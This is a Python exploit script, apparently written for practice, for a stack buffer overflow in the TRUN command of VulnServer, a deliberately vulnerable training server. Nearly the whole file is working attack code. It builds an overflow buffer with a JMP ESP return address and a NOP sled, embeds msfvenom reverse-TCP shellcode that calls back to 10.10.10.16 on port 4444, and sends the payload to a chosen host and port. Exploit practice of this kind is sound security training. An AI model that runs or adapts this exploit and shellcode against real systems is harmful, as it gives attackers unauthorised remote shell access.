#!/usr/bin/env python
"""
Description: Vanilla Buffer Overflow via "TRUN" in VulnServer
Author: Cody Winkler
Contact: @cwinfosec (twitter)
Date: 9/10/2019
Tested On: Windows XP SP2 EN

[+] Usage: python expoit.py <IP> <PORT> 

$ python exploit.py 127.0.0.1 9999
"""
import socket
from struct import pack
import sys

host = sys.argv[1]
port = int(sys.argv[2])

# 0x625011AF | JMP ESP | essfunc.dll

jmp_esp = "\xaf\x11\x50\x62"

# msfvenom -p windows/shell_reverse_tcp LHOS=10.10.10.16 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -f c

shellcode = ("\xbf\xcc\x13\x21\xe9\xda\xdf\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x31\x7d\x12\x83\xc5\x04\x03\xb1\x1d\xc3\x1c\xb5\xca\x81"
"\xdf\x45\x0b\xe6\x56\xa0\x3a\x26\x0c\xa1\x6d\x96\x46\xe7\x81"
"\x5d\x0a\x13\x11\x13\x83\x14\x92\x9e\xf5\x1b\x23\xb2\xc6\x3a"
"\xa7\xc9\x1a\x9c\x96\x01\x6f\xdd\xdf\x7c\x82\x8f\x88\x0b\x31"
"\x3f\xbc\x46\x8a\xb4\x8e\x47\x8a\x29\x46\x69\xbb\xfc\xdc\x30"
"\x1b\xff\x31\x49\x12\xe7\x56\x74\xec\x9c\xad\x02\xef\x74\xfc"
"\xeb\x5c\xb9\x30\x1e\x9c\xfe\xf7\xc1\xeb\xf6\x0b\x7f\xec\xcd"
"\x76\x5b\x79\xd5\xd1\x28\xd9\x31\xe3\xfd\xbc\xb2\xef\x4a\xca"
"\x9c\xf3\x4d\x1f\x97\x08\xc5\x9e\x77\x99\x9d\x84\x53\xc1\x46"
"\xa4\xc2\xaf\x29\xd9\x14\x10\x95\x7f\x5f\xbd\xc2\x0d\x02\xaa"
"\x27\x3c\xbc\x2a\x20\x37\xcf\x18\xef\xe3\x47\x11\x78\x2a\x90"
"\x56\x53\x8a\x0e\xa9\x5c\xeb\x07\x6e\x08\xbb\x3f\x47\x31\x50"
"\xbf\x68\xe4\xf7\xef\xc6\x57\xb8\x5f\xa7\x07\x50\xb5\x28\x77"
"\x40\xb6\xe2\x10\xeb\x4d\x65\x15\xe6\x47\x65\x41\xf4\x57\x94"
"\xcd\x71\xb1\xfc\xfd\xd7\x6a\x69\x67\x72\xe0\x08\x68\xa8\x8d"
"\x0b\xe2\x5f\x72\xc5\x03\x15\x60\xb2\xe3\x60\xda\x15\xfb\x5e"
"\x72\xf9\x6e\x05\x82\x74\x93\x92\xd5\xd1\x65\xeb\xb3\xcf\xdc"
"\x45\xa1\x0d\xb8\xae\x61\xca\x79\x30\x68\x9f\xc6\x16\x7a\x59"
"\xc6\x12\x2e\x35\x91\xcc\x98\xf3\x4b\xbf\x72\xaa\x20\x69\x12"
"\x2b\x0b\xaa\x64\x34\x46\x5c\x88\x85\x3f\x19\xb7\x2a\xa8\xad"
"\xc0\x56\x48\x51\x1b\xd3\x78\x18\x01\x72\x11\xc5\xd0\xc6\x7c"
"\xf6\x0f\x04\x79\x75\xa5\xf5\x7e\x65\xcc\xf0\x3b\x21\x3d\x89"
"\x54\xc4\x41\x3e\x54\xcd")

buffer = "TRUN /.:/"
buffer += "A"*2003
buffer += jmp_esp
buffer += "\x90"*16
buffer += shellcode
buffer += "C"*(3500-len(jmp_esp)-len(shellcode)-len(buffer))


try:
    print "[+] Connecting to target"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.recv(1024)
    print "[+] Sent payload with length: %d" % len(buffer)
    s.send(buffer)
    s.close()
except:
    print "[-] Something went wrong :("
